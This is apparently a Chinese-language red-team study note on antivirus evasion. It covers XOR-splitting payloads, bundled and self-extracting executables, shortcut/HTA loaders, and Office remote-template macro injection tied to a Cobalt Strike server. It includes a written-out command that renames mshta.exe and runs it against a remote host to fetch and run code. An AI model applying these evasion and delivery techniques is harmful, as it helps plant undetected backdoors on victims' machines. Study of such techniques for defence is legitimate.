# 免杀

#### 1、

​      捆绑的exe免杀

先将bin文件异或后再生成exe用来调用bin 文件，分离：

![image-20241227135020461](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525387.png)

![image-20241227135600527](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525388.png)

这里就是分离的思想，只需要将后门exe免杀就行，捆绑后的exe也是免杀的。



#### 2、

自解压免杀

一样，也是将我们的后门exe免杀就行。

#### 3、

  快捷方式-------主要：1、拦截执行下载的mshta.exe程序，2、远程下载的hta文件

![image-20241227173500530](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525389.png)

绕拦截            后面图像有问题，中间翻车制作vba的免杀被剪掉了，vba在这里火绒是既要mshta程序进行处理，又要对vba本身进行混淆加密。

hta文档里的vba文件直接被杀，所以需要做免杀：

![image-20241227192737444](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525390.png)

![image-20241227192715013](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525391.png)

加密：

![image-20241227194313535](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525392.png)

用cmd.exe调用执行copy 将刚才加密后的两个vbs放到web站点上：

![image-20241227194424214](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525393.png)

制作powershell的免杀---------这里都是做的快捷方式的hta文件，只是hta有许多格式。powershell、vba     这里是要对powershell.exe进行copy处理，但是不用对powershell执行的命令免杀，这就是内存问题。

![image-20241227201203409](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525394.png)

C:\Windows\System32\cmd.exe /c copy C:\Windows\System32\mshta.exe ms.exe & ms.exe http://192.168.139.128:96/download/file.ext     ![image-20241227201240328](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525395.png)

现在这方法已经不适用了，用不了了。远程调用时候会被杀。



#### 4、

   office 宏免杀。模板免杀，这里找到模板的地址，发现创建一个模板文档时会调用一个路径，这路径就是模板的地址，那么就可以更改他调用的模板路径为我们宏的远程地址，进而加载上线。但是这里只能过表面，运行加载远程宏时会被发现

生成一个宏模板文件 11.docx，宏为空的，将宏模板后缀改为zip，打开后后有setting 文件

![image-20241227202240358](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525396.png)

打开setting 文件：

![image-20241227202622703](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525397.png)

这里就是将这个地址改为我们的远程地址：qdaaa.dotm 里面加宏代码后门，保存为dotm的宏模板文件,放到我们的cs远程地址上。然后重新打开刚才的setting 文件，替换为我们的远程地址，  在重新打开  11.docx 就可以执行宏代码上线。

![image-20241227203110109](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525398.png)

这里的宏代码需要经过加密，也可以用刚才的vbs加密器进行加密。

![image-20241227203035552](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506161525399.png)

